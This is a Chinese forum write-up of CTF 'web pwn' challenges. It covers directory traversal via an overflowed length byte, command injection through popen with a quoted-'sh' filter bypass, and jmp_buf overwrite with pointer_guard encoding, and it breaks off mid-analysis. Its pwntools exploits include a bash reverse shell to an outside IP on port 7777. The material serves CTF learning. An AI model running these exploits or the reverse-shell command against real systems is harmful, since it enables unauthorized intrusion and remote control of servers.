---
title: Web Pwn常见利用方式总结
url: https://forum.butian.net/share/3911
source: 奇安信攻防社区
date: 2024-12-04
fetch_date: 2025-10-06T19:36:27.123589
---

# Web Pwn常见利用方式总结

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Web Pwn常见利用方式总结

本篇文章总结了web pwn常见的利用方式

目录穿越
====
- 此题是NKCTF2024 httpd这道题
题目分析
----
1. %\[^ \] 是C语言中 scanf 和 sscanf 函数用于格式化输入的格式化字符串中的一个格式说明符。具体地，%\[^ \] 表示要读取的输入字符序列直到遇到第一个空格字符（空格字符之前的字符），然后将其存储到对应的变量中。其中 ^ 符号表示取反，\[^ \] 表示除了空格之外的所有字符。这样的格式化说明符通常用于读取字符串中的单词或特定字符之间的内容。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-32bd70cd2207a8b3551cb9e896ff58b6d04d359c.png)
2. \*\*这里最主要的漏洞是v7是char型，那么strlen后超过255后会有溢出漏洞，那么就可以由此进行目录穿越\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-fe232ee351f1bf7740c3b249d262f512c88650e6.png)
3. 利用scandir函数进行目录扫描,通过扫描../目录得到../flag.txt目录进行输出
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-c9934efacfa4cb19b23396a94a6c2776077da970.png)
4. 区分sscanf函数与scanf函数
- scanf 函数：
scanf 函数从标准输入流（通常是键盘）读取输入，可以使用格式化字符串来指定期望输入的格式。
它通常用于从用户键盘输入的交互式输入中读取数据。
例如：scanf("%d %f", &amp;intVar, &amp;floatVar); 会尝试从标准输入中读取一个整数和一个浮点数。
- sscanf 函数：
sscanf 函数用于从一个字符串中按照指定的格式解析数据，与 scanf 不同，它不是直接从标准输入流中读取数据，而是从给定的字符串中读取数据。它通常用于解析字符串中的特定格式的数据。
例如：sscanf(str, "%d %f", &amp;intVar, &amp;floatVar); 会尝试从字符串 str 中读取一个整数和一个浮点数。
5. 最后就是要慢慢逆向出逻辑就好了
exp
---
```python
from pwn import \*
import sys
LOCAL = len(sys.argv) == 1
if LOCAL:
p = process('./httpd')
else:
p = remote(sys.argv[1], int(sys.argv[2]))
p.send(b'GET /.' + b'/' \* 256 + b'.. HTTP/1.0\r\n')
p.send(b'host: 0.0.0.10\r\n')
p.send(b'Content-length: 0\r\n')
p.recvuntil(b'./flag.txt:')
data = p.recvline(keepends=False)
from Crypto.Cipher import ARC4
print(ARC4.new(b'reverse').decrypt(data))
# p.interactive()
p.close()
# NKCTF{35c16fb6-2a41-4b83-b04c-c939281bea4c}
```
基于popen函数的攻击
============
- 2024羊城杯vhttpd
题目没有给libc,保护全开，还是32位，看到这些基本就没有想栈溢出方面的事情了
可以发现这个与以往的web pwn有一些不同，这里有个之前没见过的过滤函数，但绕过这个过滤很简单
```c
\_BOOL4 \_\_cdecl whitelist(const char \*a1)
{
\_BOOL4 result; // eax
char needle[3]; // [esp+15h] [ebp-13h] BYREF
char v3[4]; // [esp+18h] [ebp-10h] BYREF
unsigned int v4; // [esp+1Ch] [ebp-Ch]
v4 = \_\_readgsdword(0x14u);
strcpy(needle, "sh");
strcpy(v3, "bin");
if ( strchr(a1, '&') )
{
result = 0;
}
else if ( strchr(a1, '|') )
{
result = 0;
}
else if ( strchr(a1, ';') )
{
result = 0;
}
else if ( strchr(a1, '$') )
{
result = 0;
}
else if ( strchr(a1, '{') )
{
result = 0;
}
else if ( strchr(a1, '}') )
{
result = 0;
}
else if ( strchr(a1, '`') )
{
result = 0;
}
else if ( strstr(a1, needle) )
{
result = 0;
}
else
{
result = strstr(a1, v3) == 0;
}
if ( v4 != \_\_readgsdword(0x14u) )
stack\_fail\_error();
return result;
}
```
然后看看有没有目录穿越，发现是做不到的，注意到这里有一段代码,最关键的就是这个popen函数
popen 函数用于创建一个管道，通过该管道可以让一个进程执行 shell 命令并与该命令进行输入或输出通信。
```c
/\*
FILE \*freopen(const char \*filename, const char \*mode, FILE \*stream);
freopen 函数用于重定向一个已经打开的文件流。它可以将一个文件流（例如 stdin、stdout 或 stderr）重定向到一个指定的文件。
int dup(int oldfd);
返回值: 成功时，返回新的文件描述符（一个非负整数）；失败时，返回 -1，并设置 errno 以指示错误。
int dup2(int oldfd, int newfd);
dup2 函数的具体作用是将一个现有的文件描述符(newfd)复制到另一个指定的文件描述符(oldfd)上。这个操作使得两个文件描述符指向同一个文件或资源，拥有相同的文件偏移量和访问模式。
\*/
v3 = fileno(stdout);
new\_stdout = dup(v3);
v4 = fileno(stderr);
new\_stderr = dup(v4);
freopen("/dev/null", "w", stdout);
freopen("/dev/null", "w", stderr);
stream = popen("sh >/dev/null", modes);
if ( stream )
{
pclose(stream);
v6 = fileno(stdout);
dup2(new\_stdout, v6);
v7 = fileno(stderr);
dup2(new\_stderr, v7);
close(new\_stdout);
close(new\_stderr);
/\*
...
\*/
}
```
- 由此思路就明确了，直接用这个popen函数执行sh，然后反弹shell即可
- exp
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import \*
context(os='linux', arch='amd64', log\_level='debug')
p = process("/home/zp9080/PWN/httpd")
# p=remote('139.155.126.78',31700)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/httpd")
libc=elf.libc
def dbg():
gdb.attach(p,"b \*$rebase(0x1BEE)")
pause()
host = '0.0.0.10'
request = 'GET /"s"h HTTP/1.0\r\n'
request += 'Host: ' + host + '\r\n'
request += 'Content-Length: 0\r\n'
p.sendline(request)
p.sendline('bash -c "bash -i >& /dev/tcp/172.18.211.41/7777 0>&1"')
p.interactive()
```
基于jmp\\_buf结构体的攻击
================
前置知识
----
### jmp\\_buf结构体
setjmp.h 头文件定义了宏 setjmp()、函数 longjmp() 和变量类型 jmp\\_buf，该变量类型会绕过正常的函数调用和返回规则
jmp\\_buf 是一个数据类型，用于保存调用环境，包括栈指针、指令指针和寄存器等。在执行 setjmp() 时，这些环境信息会被保存到 jmp\\_buf 类型的变量中。
int setjmp(jmp\\_buf environment)
这个宏把当前环境保存在变量 environment 中，以便函数 longjmp() 后续使用。如果这个宏直接从宏调用中返回，则它会返回零，但是如果它从 longjmp() 函数调用中返回，则它会返回一个非零值。
void longjmp(jmp\\_buf environment, int value)
该函数恢复最近一次调用 setjmp() 宏时保存的环境，jmp\\_buf 参数的设置是由之前调用 setjmp() 生成的。
\*\*根据上述内容，如果jmp\\_buf结构体存储在栈上，并且我们可以栈溢出覆盖到此处，那么将可以控制程序的流程!!!\*\*
### pointer\\_guard
- 结构体的类型为struct pthread，我们称其为一个thread descriptor，该结构体的第一个域为tchhead\\_t类型，其定义如下：
```C
typedef struct
{
void \*tcb; /\* Pointer to the TCB. Not necessarily the
thread descriptor used by libpthread. \*/
dtv\_t \*dtv;
void \*self; /\* Pointer to the thread descriptor. \*/
int multiple\_threads;
int gscope\_flag;
uintptr\_t sysinfo;
uintptr\_t stack\_guard; 0x28
uintptr\_t pointer\_guard; 0x30
unsigned long int vgetcpu\_cache[2];
/\* Bit 0: X86\_FEATURE\_1\_IBT.
Bit 1: X86\_FEATURE\_1\_SHSTK.
\*/
unsigned int feature\_1;
int \_\_glibc\_unused1;
/\* Reservation of some values for the TM ABI. \*/
void \*\_\_private\_tm[4];
/\* GCC split stack support. \*/
void \*\_\_private\_ss;
/\* The lowest address of shadow stack, \*/
unsigned long long int ssp\_base;
/\* Must be kept even if it is no longer used by glibc since programs,
like AddressSanitizer, depend on the size of tcbhead\_t. \*/
\_\_128bits \_\_glibc\_unused2[8][4] \_\_attribute\_\_ ((aligned (32)));
void \*\_\_padding[8];
} tcbhead\_t;
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-41afe4ec226a368729fae2d3a2f1d98a17c1a7e1.png)
- 可以看到这两个宏利用pointer\\_guard分别对指针进行了加密和解密操作，加密由一次异或以及一次bitwise rotate组成。加密使用的key来自fs:\[offsetof(tcbhead\\_t, pointer\\_guard)\]， 利用pointer\\_guard进行加密的过程可以表示为rol(ptr ^ pointer\\_guard, 0x11, 64)，解密的过程为ror(enc, 0x11, 64) ^ pointer\\_guard
- 因此我们写入数据的时候用这个加密方式就可以了
eg: ```python
#bin会给数字转化为2进制，但是会带上0b，因此要取[2:]
def ROL(content, key):
tmp = bin(content)[2:].rjust(64, '0')
return int(tmp[key:] + tmp[:key], 2)
ROL(gadget\_addr ^ pointer\_guard, 0x11)
```
\*\*这里以DASCTF2024暑期挑战赛 vhttp为例,讲解这个漏洞的利用过程（此题是libc2.31，实操发现如果是libc2.35打不通）\*\*
逆向分析
----
- main中一般都是先处理http包,常见格式如下
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-a09a9842c4ff715445b0881743434efe3cdc87f9.png)
```python
payload = b"GET /index.html HTTP/1.1\r\n"
payload+= b"content-length:2848\r\n"
```
- 逆向出的结构体 ```C
```
struct http\\_header
{
char \*method;
char\* path;
char \*version;
int header\\_count;
struct Header\* headers;
char \\* data;
int content\\_length;
jmp\\_buf err;
};
```php
\* 处理完http包后一般看haystack是否包含flag相关字符串然后进行不同的函数处理
\* func1,处理路径得到绝对路径，并输出http包相关内容
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-dd348a44e9c1022a4f6178e0741a448b9ed10bc6.png)
\* func2,打开文件，如果直接是一个文件那么就输出文件内容，如果是一个文件夹那么就遍历输出文件夹中有哪些文件
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-bb81a974b4f5ed25c87d89dfafd8ed515f5c4aa6.png)
![image.png](https://cdn-yg...